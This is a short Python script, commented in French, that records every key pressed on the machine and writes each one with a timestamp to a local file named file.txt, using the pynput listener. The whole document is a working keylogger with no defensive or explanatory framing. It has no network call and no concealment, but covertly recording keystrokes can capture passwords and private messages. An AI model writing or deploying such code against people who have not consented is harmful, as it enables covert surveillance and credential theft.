# import les librairie
from pynput.keyboard import Listener
from logging import basicConfig, DEBUG, info

# crée le ficher 
file = "file.txt"
basicConfig(filename=file, level=DEBUG, format="%(asctime)s %(message)s")


# récupère les touche cliquée
def on_press(key):
    info(key)
    

# lis les touche cliqueée est les import
with Listener(on_press=on_press) as listener:
    listener.join()
